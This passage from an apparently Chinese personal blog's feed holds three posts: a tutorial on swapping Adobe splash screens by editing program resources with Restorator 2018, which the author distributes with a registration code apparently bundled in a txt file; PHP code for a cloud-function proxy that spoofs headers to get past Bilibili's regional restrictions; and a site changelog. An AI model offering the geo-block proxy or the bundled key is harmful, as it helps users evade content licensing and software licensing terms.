        <content type="html"><![CDATA[<details class="folding-tag" red><summary> 查看参考教程 </summary>              <div class='content'>              <p><a href="https://www.coolapk.com/feed/32265727?shareKey=NmE4MjQ0YzI4ZGU2NjMwZjQyMjU~&amp;shareUid=1815173&amp;shareFrom=com.coolapk.market_12.4.2">如何制作属于自己的Adobe启动界面 -酷安</a></p>              </div>            </details><h2 id="预览"><a href="#预览" class="headerlink" title="预览"></a>预览</h2><div class="tabs" id="预览"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#预览-1">Photoshop</button></li><li class="tab"><button type="button" data-href="#预览-2">Premiere-Pro</button></li><li class="tab"><button type="button" data-href="#预览-3">After-Effects</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="预览-1"><p><img src="https://img.dreamfall.cn/post/adobe-start/preview1.webp" alt="PS"></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="预览-2"><p><img src="https://img.dreamfall.cn/post/adobe-start/preview2.webp" alt="PR"></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="预览-3"><p><img src="https://img.dreamfall.cn/post/adobe-start/preview3.webp" alt="AE"></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><ol><li>adobe软件</li><li>PhotoShop（用于图片操作）</li><li>Restorator 2018 （见进阶教程，针对软件：AE，AI，AU，LR ）下载地址：<a href="https://pan.dreamfall.cn/blog/adobe-start/Restorator2018.zip">梦璃雨落的网盘</a></li><li>icon提取（见异类教程，针对软件：PS） 下载地址：<a href="https://pan.dreamfall.cn/blog/adobe-start/icon%20提取.zip">梦璃雨落的网盘</a></li></ol><h2 id="一般教程"><a href="#一般教程" class="headerlink" title="一般教程"></a>一般教程</h2><p>以pr为例</p><ol><li>打开pr的安装目录，在安装目录里找到名为<strong>PNG</strong>的文件夹<br><img src="https://img.dreamfall.cn/post/adobe-start/pr1.webp" alt="pr1"></li><li>在里面找到<strong>“pr_splash”</strong>这个文件，这里面总共有三个相似文件，可以根据自己的电脑分辨率选择（我是2.5k屏，对应的文件是pr_splash@3to2x.png），如果不知道选哪个那就全都改一遍吧（<br><img src="https://img.dreamfall.cn/post/adobe-start/pr2.webp" alt="pr2"></li><li>用Photoshop打开对应文件<strong>（记得备份源文件）</strong>，然后把右边的一块图片抠掉<br><img src="https://img.dreamfall.cn/post/adobe-start/pr3.webp" alt="pr3"></li><li>然后拖入你想要替换的图片到ps中，将图层置于这个图层下面。<br><img src="https://img.dreamfall.cn/post/adobe-start/pr4.webp" alt="pr4"></li><li>然后快速导出为PNG即可，将修改的PNG图片替换源文件<strong>（记得备份源文件（再次提醒））</strong></li></ol><h2 id="进阶教程"><a href="#进阶教程" class="headerlink" title="进阶教程"></a>进阶教程</h2><p>一般教程只能对Adobe中的少部分软件有效，假如PNG文件夹里没有启动图或者没有PNG文件夹，那就得要用进阶教程了<br>Restorator 2018和icon提取的<a href="https://pan.dreamfall.cn/blog/adobe-start">下载链接</a></p><p>下面以Ae为例</p><ol><li>下载安装Restorator 2018，并安装，注册码在txt文件里</li><li>打开Ae安装目录的Support Files文件夹，将<strong>AfterFXLib.dll</strong>文件拖入到“Restorator 2018”的窗口中，打开PNG文件夹，将<strong>AE_SPLASH</strong>相似的三个文件导出，然后按照一般教程的第三步修改启动图<br><img src="https://img.dreamfall.cn/post/adobe-start/ae1.webp" alt="ae1"></li><li>修改完后将<strong>对应</strong>的文件拖入“Restorator 2018”软件中<strong>对应</strong>的资源上（一定要对应）<br><img src="https://img.dreamfall.cn/post/adobe-start/ae2.webp" alt="ae2"></li><li>另存为，将修改后的文件另存为，<strong>备份源文件</strong>，再进行替换<br><img src="https://img.dreamfall.cn/post/adobe-start/ae3.webp" alt="ae3"><h2 id="异类教程"><a href="#异类教程" class="headerlink" title="异类教程"></a>异类教程</h2>接下来是最后一个“异 类“：PS</li><li>下好“icon提取”，然后找到PS安装目录下的“Resources”文件夹，将它复制到“icon提取”文件夹中 。<br><img src="https://img.dreamfall.cn/post/adobe-start/ps1.webp" alt="ps1"></li><li>运行“Extract.cmd”，会得到一个“Work”文件夹 ，点击进去，同样的，我是2k屏幕所以修改的是“High”文件夹中的图片，其他设备请自行尝试。</li><li>在这两个文件夹任意一个中找到“Splash1080Background_s0.png”文件，将他复制出来，使用PS修改，再粘贴回去覆盖掉。<br><img src="https://img.dreamfall.cn/post/adobe-start/ps2.webp" alt="ps2"></li><li>之后一路返回到“icon提取”文件夹，点击“Pack.cmd”，运行完成后点进“Work”文件夹，将里面的“Resources”文件夹粘贴回Ps的安装目录下即可。</li></ol><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>各个软件启动界面文件名称（以本人2.5k屏幕所修改的文件为例）<br>AE：AE_SPLASH_AT_3TO2X.png<br>AI：ai_cc_splash@3to2x.png<br>AU：AU_SPLASH_AT_3TO2X.png<br>LR：LRC_SPLASH~1.5X.png<br>PR：pr_splash@3to2x.png<br>PS：Splash1080Background_s0.png</p><p>各个软件的启动界面所在目录：<br>PR: Adobe\Adobe Premiere Pro 2022\PNG\ pr_splash.png<br>AE: Adobe\Adobe After Effects 2022\Support Files\AfterFXLib.dll<br>AI: Adobe\Adobe Illustrator 2022\Support Files\Contents\Windows\ai_cc_splash<br>AU: Adobe\Adobe Audition 2022\AuUI.dll<br>LR: Adobe\Adobe Lightroom Classic\Lightroom.exe<br>PS: Adobe\Adobe Photoshop 2022\ Resources</p><h2 id="资源"><a href="#资源" class="headerlink" title="资源"></a>资源</h2><p>我已经修改好的<a href="https://pan.dreamfall.cn/blog/adobe-start/ps,pr,ae修改后文件（含备份）.zip">ps,pr,ae启动图（含备份）</a></p>]]></content>
      
      
      <categories>
          
          <category> 教程 </category>
          
          <category> Adobe </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Adobe </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>利用阿里云函数免费解除b站区域限制</title>
      <link href="/post/bilibili/"/>
      <url>/post/bilibili/</url>
      
        <content type="html"><![CDATA[<h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><p>你需要一个阿里云的账号并完成实名认证</p><h2 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h2><h3 id="创建服务"><a href="#创建服务" class="headerlink" title="创建服务"></a>创建服务</h3><ol><li>首先进入<a href="https://fcnext.console.aliyun.com/">阿里云函数计算</a>，点击侧边栏<strong>服务和函数</strong></li><li>选择当前区域为<strong>中国（香港）</strong></li><li><strong>创建服务</strong>，名称随意，剩下的默认即可<br><img src="https://img.dreamfall.cn/post/bilibili/1.webp" alt="创建服务"><h3 id="创建函数"><a href="#创建函数" class="headerlink" title="创建函数"></a>创建函数</h3></li><li>进入刚刚创建的服务，点击左上<strong>创建函数</strong></li><li>选择使用<strong>标准的 Runtime 从零创建</strong>，函数名称随意，请求处理程序类型选择<strong>处理HTTP</strong>请求</li><li>运行环境选择<strong>PHP7.2</strong>，代码上传方式默认即可<br><img src="https://img.dreamfall.cn/post/bilibili/2.webp" alt="创建函数1"></li><li>在高级配置里选择弹性实例，内存规格<strong>128MB</strong>，执行超时时间<strong>15</strong>秒，别的无需修改，直接创建即可<br><img src="https://img.dreamfall.cn/post/bilibili/3.webp" alt="创建函数2"><h3 id="编辑函数"><a href="#编辑函数" class="headerlink" title="编辑函数"></a>编辑函数</h3>进入函数详情页，将下面代码<strong>替换</strong>原有的代码，然后点<strong>部署函数</strong><br><img src="https://img.dreamfall.cn/post/bilibili/4.webp" alt="编辑函数"></li></ol><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">RingCentral</span>\<span class="title">Psr7</span>\<span class="title">Response</span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">To enable the initializer feature (https://help.aliyun.com/document_detail/89029.html)</span></span><br><span class="line"><span class="comment">please implement the initializer function as below：</span></span><br><span class="line"><span class="comment">function initializer($context) &#123;</span></span><br><span class="line"><span class="comment">    echo &#x27;initializing&#x27; . PHP_EOL;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">handler</span>(<span class="params"><span class="variable">$request</span>, <span class="variable">$context</span></span>): <span class="title">Response</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    $body       = $request-&gt;getBody()-&gt;getContents();</span></span><br><span class="line"><span class="comment">    $queries    = $request-&gt;getQueryParams();</span></span><br><span class="line"><span class="comment">    $method     = $request-&gt;getMethod();</span></span><br><span class="line"><span class="comment">    $headers    = $request-&gt;getHeaders();</span></span><br><span class="line"><span class="comment">    $path       = $request-&gt;getAttribute(&#x27;path&#x27;);</span></span><br><span class="line"><span class="comment">    $requestURI = $request-&gt;getAttribute(&#x27;requestURI&#x27;);</span></span><br><span class="line"><span class="comment">    $clientIP   = $request-&gt;getAttribute(&#x27;clientIP&#x27;);</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="comment">/* Config */</span></span><br><span class="line">    <span class="variable">$upstream_pc_url</span> = <span class="string">&#x27;https://api.bilibili.com/pgc/player/web/playurl&#x27;</span>;</span><br><span class="line">    <span class="variable">$upstream_app_url</span> = <span class="string">&#x27;https://api.bilibili.com/pgc/player/api/playurl&#x27;</span>;</span><br><span class="line">    <span class="variable">$upstream_pc_search_url</span> = <span class="string">&#x27;https://api.bilibili.com/x/web-interface/search/type&#x27;</span>;</span><br><span class="line">    <span class="variable">$timeout</span> = <span class="number">5</span>; <span class="comment">// seconds</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Read incoming request */</span></span><br><span class="line">    <span class="variable">$request_method</span> = <span class="variable">$request</span>-&gt;<span class="title function_ invoke__">getMethod</span>();</span><br><span class="line">    <span class="variable">$request_query</span> = <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">stristr</span>(<span class="variable">$request</span>-&gt;<span class="title function_ invoke__">getAttribute</span>(<span class="string">&quot;requestURI&quot;</span>), <span class="string">&#x27;?&#x27;</span>),<span class="number">1</span>);</span><br><span class="line">    <span class="comment">//$request-&gt;getHeaderLine(&#x27;referer&#x27;)会被阿里云替换成云函url</span></span><br><span class="line">    <span class="comment">//$req_referer = $request-&gt;getHeaderLine(&#x27;referer&#x27;);</span></span><br><span class="line">    <span class="variable">$req_referer</span> = <span class="string">&quot;https://www.bilibili.com&quot;</span>;</span><br><span class="line">    <span class="variable">$request_headers</span> = <span class="variable">$request</span>-&gt;<span class="title function_ invoke__">getHeaders</span>();</span><br><span class="line">    <span class="variable">$request_body</span> = <span class="variable">$request</span>-&gt;<span class="title function_ invoke__">getBody</span>()-&gt;<span class="title function_ invoke__">getContents</span>();</span><br><span class="line">    <span class="variable">$request_uri</span> = <span class="variable">$request</span>-&gt;<span class="title function_ invoke__">getAttribute</span>(<span class="string">&#x27;requestURI&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Forward request */</span></span><br><span class="line">    <span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line"></span><br><span class="line">    <span class="comment">//处理请求相关header</span></span><br><span class="line">    <span class="variable">$request_headers</span> = <span class="title function_ invoke__">array_remove_by_key</span>(<span class="variable">$request_headers</span>,<span class="string">&#x27;X-Forwarded-Proto&#x27;</span>);</span><br><span class="line">    <span class="variable">$request_headers</span> = <span class="title function_ invoke__">array_remove_by_key</span>(<span class="variable">$request_headers</span>,<span class="string">&#x27;Host&#x27;</span>);</span><br><span class="line">    <span class="variable">$request_headers</span> = <span class="title function_ invoke__">array_remove_by_key</span>(<span class="variable">$request_headers</span>,<span class="string">&#x27;Referer&#x27;</span>);</span><br><span class="line">    <span class="comment">//配置body压缩方式</span></span><br><span class="line">    <span class="variable">$request_headers</span> = <span class="title function_ invoke__">array_remove_by_key</span>(<span class="variable">$request_headers</span>,<span class="string">&#x27;Accept-Encoding&#x27;</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_ENCODING, <span class="string">&quot;identity&quot;</span>);<span class="comment">//好像b站只有br压缩</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$headers</span> = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$request_headers</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">        <span class="variable">$headers</span>[] = <span class="variable">$key</span> . <span class="string">&quot;: &quot;</span> .<span class="title function_ invoke__">implode</span>(<span class="variable">$value</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//判断请求接口</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">substr_count</span>(<span class="variable">$request_uri</span>,<span class="string">&#x27;/search/type&#x27;</span>)!=<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="variable">$url</span> = <span class="variable">$upstream_pc_search_url</span> . <span class="string">&#x27;?&#x27;</span> .<span class="variable">$request_query</span>;</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_REFERER, <span class="variable">$req_referer</span>);</span><br><span class="line">    &#125;<span class="keyword">elseif</span> (<span class="title function_ invoke__">substr_count</span>(<span class="variable">$request_uri</span>,<span class="string">&#x27;playurl&#x27;</span>)!=<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="comment">//判断使用的那个pc还是app接口</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">substr_count</span>(<span class="variable">$request_query</span>,<span class="string">&#x27;platform=android&#x27;</span>)!=<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="variable">$url</span> = <span class="variable">$upstream_app_url</span> . <span class="string">&#x27;?&#x27;</span> .<span class="variable">$request_query</span>;</span><br><span class="line">            <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_USERAGENT, <span class="string">&#x27;Bilibili Freedoooooom/MarkII&#x27;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$url</span> = <span class="variable">$upstream_pc_url</span> . <span class="string">&#x27;?&#x27;</span> .<span class="variable">$request_query</span>;</span><br><span class="line">            <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_REFERER, <span class="variable">$req_referer</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$header</span>[<span class="string">&#x27;Content-Type&#x27;</span>] = <span class="string">&#x27;text/plain&#x27;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Response</span>(</span><br><span class="line">            <span class="number">502</span>,</span><br><span class="line">            <span class="variable">$header</span>,</span><br><span class="line">            <span class="string">&#x27;Failed to match interface.&#x27;</span></span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//curl配置</span></span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_TIMEOUT, <span class="variable">$timeout</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_CUSTOMREQUEST, <span class="variable">$request_method</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HTTPHEADER, <span class="variable">$headers</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_POSTFIELDS, <span class="variable">$request_body</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="literal">true</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_FOLLOWLOCATION, <span class="literal">false</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$response</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line">    <span class="variable">$header</span> = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$response</span> === <span class="literal">false</span>) &#123;</span><br><span class="line">        <span class="variable">$header</span>[<span class="string">&#x27;Content-Type&#x27;</span>] = <span class="string">&#x27;text/plain&#x27;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Response</span>(</span><br><span class="line">            <span class="number">502</span>,</span><br><span class="line">            <span class="variable">$header</span>,</span><br><span class="line">            <span class="string">&#x27;Upstream host did not respond.&#x27;</span></span><br><span class="line">        );</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$header_length</span> = <span class="title function_ invoke__">curl_getinfo</span>(<span class="variable">$ch</span>, CURLINFO_HEADER_SIZE);</span><br><span class="line">        <span class="variable">$response_headers</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&quot;\n&quot;</span>, <span class="title function_ invoke__">substr</span>(<span class="variable">$response</span>, <span class="number">0</span>, <span class="variable">$header_length</span>));</span><br><span class="line">        <span class="variable">$response_body</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$response</span>, <span class="variable">$header_length</span>);</span><br><span class="line">        <span class="comment">//处理返回相关header</span></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$response_headers</span> <span class="keyword">as</span> <span class="variable">$n</span> =&gt; <span class="variable">$response_header</span>) &#123;</span><br><span class="line">            <span class="comment">//配置返回的body压缩方式</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$response_header</span>, <span class="string">&quot;Content-Encoding&quot;</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line">                <span class="variable">$response_headers</span>[<span class="variable">$n</span>] = <span class="string">&quot;Content-Encoding: identity\n&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//删除B站返回的Content-Length,防止浏览器只读取Content-Length长度的数据,造成json不完整</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$response_header</span>, <span class="string">&quot;Content-Length&quot;</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line">                <span class="keyword">unset</span>(<span class="variable">$response_headers</span>[<span class="variable">$n</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//阿里云函数好像会自己添加Access-Control-Allow-Credentials头，删除b站返回的</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$response_header</span>, <span class="string">&quot;Access-Control-Allow-Credentials&quot;</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line">                <span class="keyword">unset</span>(<span class="variable">$response_headers</span>[<span class="variable">$n</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">unset</span>(<span class="variable">$response_header</span>); </span><br><span class="line">        </span><br><span class="line">        <span class="comment">//response_headers数组转成key=&gt;value形式</span></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$response_headers</span> <span class="keyword">as</span> <span class="variable">$header_string</span>) &#123;</span><br><span class="line">            <span class="variable">$header_tmp</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;: &#x27;</span>, <span class="variable">$header_string</span>, <span class="number">2</span>);</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">count</span>(<span class="variable">$header_tmp</span>) == <span class="number">2</span>) &#123;</span><br><span class="line">                <span class="variable">$header</span>[<span class="variable">$header_tmp</span>[<span class="number">0</span>]] = <span class="title function_ invoke__">trim</span>(<span class="variable">$header_tmp</span>[<span class="number">1</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="comment">// 这行用于调试请求信息</span></span><br><span class="line">        <span class="comment">// return new Response(200, array(), json_encode(array(&#x27;header&#x27; =&gt; $header, &#x27;body&#x27; =&gt; $response_body, &#x27;url&#x27; =&gt; $url, &#x27;response&#x27;=&gt;$response, &#x27;curl_headers&#x27;=&gt;$curl_response_headers)));</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Response</span>(</span><br><span class="line">            <span class="number">200</span>,</span><br><span class="line">            <span class="variable">$header</span>,</span><br><span class="line">            <span class="variable">$response_body</span></span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*tool*/</span></span><br><span class="line"><span class="comment">//某个字符串在另一个字符串第N此出现的下标</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">str_n_pos</span>(<span class="params"><span class="variable">$str</span>, <span class="variable">$find</span>, <span class="variable">$n</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$pos_val</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">1</span>; <span class="variable">$i</span> &lt;= <span class="variable">$n</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$pos</span> = <span class="title function_ invoke__">strpos</span>(<span class="variable">$str</span>, <span class="variable">$find</span>);</span><br><span class="line">        <span class="variable">$str</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$str</span>, <span class="variable">$pos</span> + <span class="number">1</span>);</span><br><span class="line">        <span class="variable">$pos_val</span> = <span class="variable">$pos</span> + <span class="variable">$pos_val</span> + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$count</span> = <span class="variable">$pos_val</span> - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$count</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">array_remove_by_key</span>(<span class="params"><span class="variable">$arr</span>, <span class="variable">$key</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">array_key_exists</span>(<span class="variable">$key</span>, <span class="variable">$arr</span>))&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$arr</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$keys</span> = <span class="title function_ invoke__">array_keys</span>(<span class="variable">$arr</span>);</span><br><span class="line">    <span class="variable">$index</span> = <span class="title function_ invoke__">array_search</span>(<span class="variable">$key</span>, <span class="variable">$keys</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$index</span> !== <span class="literal">FALSE</span>)&#123;</span><br><span class="line">        <span class="title function_ invoke__">array_splice</span>(<span class="variable">$arr</span>, <span class="variable">$index</span>, <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$arr</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="查看访问地址"><a href="#查看访问地址" class="headerlink" title="查看访问地址"></a>查看访问地址</h3><p>在函数详情页点击<strong>触发器管理</strong>，其中的<strong>公网访问地址</strong>就是代理地址<br><img src="https://img.dreamfall.cn/post/bilibili/5.webp" alt="访问地址"></p><h2 id="自定义域名"><a href="#自定义域名" class="headerlink" title="自定义域名"></a>自定义域名</h2><ol><li>在云函数<strong>首页</strong>点击<strong>高级功能-域名管理-添加自定义域名</strong><br><img src="https://img.dreamfall.cn/post/bilibili/7.webp" alt="自定义域名1"></li><li>输入你要的域名，然后在<strong>路由配置</strong>里选择对应的函数即可（https和cdn加速按照个人需求开启）<br><img src="https://img.dreamfall.cn/post/bilibili/8.webp" alt="自定义域名2"></li></ol><h2 id="如何使用"><a href="#如何使用" class="headerlink" title="如何使用"></a>如何使用</h2><h3 id="网页端"><a href="#网页端" class="headerlink" title="网页端"></a>网页端</h3><p>安装<a href="https://greasyfork.org/zh-CN/scripts/25718-%E8%A7%A3%E9%99%A4b%E7%AB%99%E5%8C%BA%E5%9F%9F%E9%99%90%E5%88%B6">解除b站区域限制</a>油猴脚本，在参数设置里即可使用刚刚创建的<strong>公网访问地址</strong>或者<strong>自定义域名</strong><br><img src="https://img.dreamfall.cn/post/bilibili/6.webp" alt="脚本"></p><h3 id="手机端"><a href="#手机端" class="headerlink" title="手机端"></a>手机端</h3><p>使用<a href="https://github.com/yujincheng08/BiliRoaming">哔哩漫游</a>解锁番剧限制，自定义解析服务器</p>]]></content>
      
      
      <categories>
          
          <category> 教程 </category>
          
          <category> 云函数 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 云函数 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>博客魔改日记</title>
      <link href="/post/update/"/>
      <url>/post/update/</url>
      
        <content type="html"><![CDATA[<p>是时候要给自己的博客写更新日记了，不然连自己改了什么都不知道<del>(我不是鸽子)</del></p><p>日记的起点：2022年8月22日，我决定将博客彻底开源之日</p><blockquote><p>关于以前的魔改我已无法回忆，就当作这是一次崭新的开始吧</p></blockquote><details class="folding-tag" cyan><summary> 2022年 </summary>              <div class='content'>              <details class="folding-tag" yellow><summary> 8月 </summary>              <div class='content'>              <div class="timeline blue"><div class='timeline-item headline'><div class='timeline-item-title'><div class='item-circle'><p>更新日记-8月</p></div></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>2022-08-19</p></div></div><div class='timeline-item-content'><ol><li>恢复<a href="https://github.com/meng-luo/Source-Blog/">github源码</a>的更新，并利用脚本每日上传。</li><li>重新激活github actions推送<a href="https://github.com/meng-luo/meng-luo.github.io/">部署</a>，并同步到<a href="https://mengluo.vercel.app/">vercel</a>。</li><li>更新<a href="https://blog.dreamfall.cn/bangumis/">追番</a>使用<a href="https://bgm.tv/">Bangumi</a>源。</li><li>搭建友链<a href="https://blog.dreamfall.cn/fcircle/">朋友圈</a>。</li><li>加入评论弹幕的支持</li><li>进行宽屏适配</li></ol></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>2022-08-20</p></div></div><div class='timeline-item-content'><ol><li>更新<a href="https://blog.dreamfall.cn/bangumis/">追番</a>的静态资源，通过cdn加快访问速度。</li><li>更新依赖</li></ol></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>2022-08-21</p></div></div><div class='timeline-item-content'><ol><li>更新友链<a href="https://blog.dreamfall.cn/fcircle/">朋友圈</a>，采用店长的<a href="https://akilar.top/posts/62f13a97/">Akilar-SAO</a>方案。</li><li>修改字体cdn.</li></ol></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>2022-08-22</p></div></div><div class='timeline-item-content'><ol><li>决定开始写更新日记，于是有了本篇文章</li><li>修复主页分类磁贴滚动错位</li></ol></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>2022-08-23</p></div></div><div class='timeline-item-content'><ol><li>使用sw缓存css和js</li><li>新增离线页面，可在断网时访问</li></ol></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>2022-08-25</p></div></div><div class='timeline-item-content'><ol><li>增加侧边栏天气</li><li>评论系统新增输入提示</li><li><a href="https://blog.dreamfall.cn/about/">关于页</a>新增访客统计</li></ol></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>2022-08-26</p></div></div><div class='timeline-item-content'><ol><li>修改主页归档布局</li><li>分类标签归档页增加文章索引</li><li>标签云增加文章数上下标</li><li>修改主页卡片样式</li></ol></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>2022-08-29</p></div></div><div class='timeline-item-content'><ol><li>修改离线页面</li><li>新增vercel镜像站支持</li><li>新增azure镜像站支持</li></ol></div></div></div>              </div>            </details><details class="folding-tag" blue><summary> 9月 </summary>              <div class='content'>              <div class="timeline green"><div class='timeline-item headline'><div class='timeline-item-title'><div class='item-circle'><p>更新日记-9月</p></div></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>2022-09-09</p></div></div><div class='timeline-item-content'><ol><li>新增gitee镜像站支持</li></ol></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>2022-09-12</p></div></div><div class='timeline-item-content'><ol><li>返回顶部显示网页阅读进度</li></ol></div></div></div>              </div>            </details><details class="folding-tag" green><summary> 9月 </summary>              <div class='content'>              <div class="timeline yellow"><div class='timeline-item headline'><div class='timeline-item-title'><div class='item-circle'><p>更新日记-10月</p></div></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>2022-10-29</p></div></div><div class='timeline-item-content'><ol><li>老旧浏览器弹窗提醒</li></ol></div></div></div>              </div>            </details><details class="folding-tag" yellow><summary> 11月 </summary>              <div class='content'>              <div class="timeline green"><div class='timeline-item headline'><div class='timeline-item-title'><div 